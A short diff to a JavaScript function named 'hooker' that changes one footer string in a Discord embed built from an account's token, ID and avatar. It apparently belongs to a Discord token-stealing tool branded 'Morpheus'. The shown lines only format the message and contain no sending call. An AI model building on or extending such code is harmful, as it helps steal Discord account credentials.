@@ -91,7 +91,7 @@ const hooker = async (content, token, account) => {
     url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
   };
   content["embeds"][0]["footer"] = {
-    text: "Morpheus | by Nyxoy",
+    text: "Morpheus - by Nyxoy",
     icon_url: "https://cdn.discordapp.com/avatars/1258711833800609837/72564c98be57b45f733245a8e7907a2c.webp?size=1024&format=webp",
   };
   content["embeds"][0]["title"] = content["name"];
